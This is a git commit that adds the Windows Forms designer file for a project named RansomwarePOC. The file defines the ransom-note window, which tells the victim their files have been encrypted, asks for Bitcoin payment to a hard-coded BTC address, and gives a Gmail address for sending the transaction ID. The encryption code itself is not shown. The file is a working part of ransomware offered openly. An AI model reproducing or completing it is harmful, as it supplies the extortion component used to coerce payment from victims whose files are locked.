dea949008abb8239bec35d4121fa4674ae5bd746
Reybot0123 <130043784+Reybot0123@users.noreply.github.com>
2023-04-10 14:05:33 +0800

    Add files via upload

---
+++ Encrypter/WindowsFormsApp1/Encrypter.Designer.cs
@@ -0,0 +1,174 @@
+﻿
+namespace RansomwarePOC
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.lblCount = new System.Windows.Forms.Label();
+            this.txtBitcoinAddress = new System.Windows.Forms.TextBox();
+            this.txtEmailAddress = new System.Windows.Forms.TextBox();
+            this.lblBitcoinAmount = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // lblCount
+            // 
+            this.lblCount.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.lblCount.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblCount.ForeColor = System.Drawing.Color.Lime;
+            this.lblCount.Location = new System.Drawing.Point(416, 278);
+            this.lblCount.Name = "lblCount";
+            this.lblCount.Size = new System.Drawing.Size(231, 55);
+            this.lblCount.TabIndex = 0;
+            this.lblCount.Text = "Your files (count: n) have been encrypted!";
+            this.lblCount.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            this.lblCount.Click += new System.EventHandler(this.lblCount_Click);
+            // 
+            // txtBitcoinAddress
+            // 
+            this.txtBitcoinAddress.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
+            this.txtBitcoinAddress.BackColor = System.Drawing.Color.Black;
+            this.txtBitcoinAddress.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.txtBitcoinAddress.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtBitcoinAddress.ForeColor = System.Drawing.Color.Lime;
+            this.txtBitcoinAddress.Location = new System.Drawing.Point(2, 462);
+            this.txtBitcoinAddress.Name = "txtBitcoinAddress";
+            this.txtBitcoinAddress.ReadOnly = true;
+            this.txtBitcoinAddress.Size = new System.Drawing.Size(349, 24);
+            this.txtBitcoinAddress.TabIndex = 3;
+            this.txtBitcoinAddress.Text = "3Mg8jMjhyV6gKTFLh1mG2nsXowUTzJ3evh";
+            this.txtBitcoinAddress.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            this.txtBitcoinAddress.TextChanged += new System.EventHandler(this.txtBitcoinAddress_TextChanged);
+            // 
+            // txtEmailAddress
+            // 
+            this.txtEmailAddress.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
+            this.txtEmailAddress.BackColor = System.Drawing.Color.Black;
+            this.txtEmailAddress.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
+            this.txtEmailAddress.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtEmailAddress.ForeColor = System.Drawing.Color.Lime;
+            this.txtEmailAddress.Location = new System.Drawing.Point(399, 462);
+            this.txtEmailAddress.Name = "txtEmailAddress";
+            this.txtEmailAddress.ReadOnly = true;
+            this.txtEmailAddress.Size = new System.Drawing.Size(349, 24);
+            this.txtEmailAddress.TabIndex = 4;
+            this.txtEmailAddress.Text = "I4mLev1@gmail.com";
+            this.txtEmailAddress.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // lblBitcoinAmount
+            // 
+            this.lblBitcoinAmount.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.lblBitcoinAmount.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblBitcoinAmount.ForeColor = System.Drawing.Color.Lime;
+            this.lblBitcoinAmount.Location = new System.Drawing.Point(-1, 404);
+            this.lblBitcoinAmount.Name = "lblBitcoinAmount";
+            this.lblBitcoinAmount.Size = new System.Drawing.Size(352, 55);
+            this.lblBitcoinAmount.TabIndex = 1;
+            this.lblBitcoinAmount.Text = "Please send n Bitcoin(s) to the following BTC address:";
+            this.lblBitcoinAmount.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            this.lblBitcoinAmount.Click += new System.EventHandler(this.lblBitcoinAmount_Click);
+            // 
+            // label3
+            // 
+            this.label3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.ForeColor = System.Drawing.Color.Lime;
+            this.label3.Location = new System.Drawing.Point(323, 43);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(425, 222);
+            this.label3.TabIndex = 5;
+            this.label3.Text = resources.GetString("label3.Text");
+            this.label3.TextAlign = System.Drawing.ContentAlignment.TopCenter;
+            // 
+            // label2
+            // 
+            this.label2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label2.ForeColor = System.Drawing.Color.Lime;
+            this.label2.Location = new System.Drawing.Point(399, 404);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(349, 55);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "Next, E-mail your transaction ID to the following address:";
+            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            this.label2.Click += new System.EventHandler(this.label2_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(2, 2);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(323, 382);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 6;
+            this.pictureBox1.TabStop = false;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Black;
+            this.ClientSize = new System.Drawing.Size(751, 498);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.txtEmailAddress);
+            this.Controls.Add(this.txtBitcoinAddress);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.lblBitcoinAmount);
+            this.Controls.Add(this.lblCount);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
+            this.Name = "Form1";
+            this.Text = "Lol";
+            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label lblCount;
+        private System.Windows.Forms.TextBox txtBitcoinAddress;
+        private System.Windows.Forms.TextBox txtEmailAddress;
+        private System.Windows.Forms.Label lblBitcoinAmount;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.PictureBox pictureBox1;
+    }
+}
+
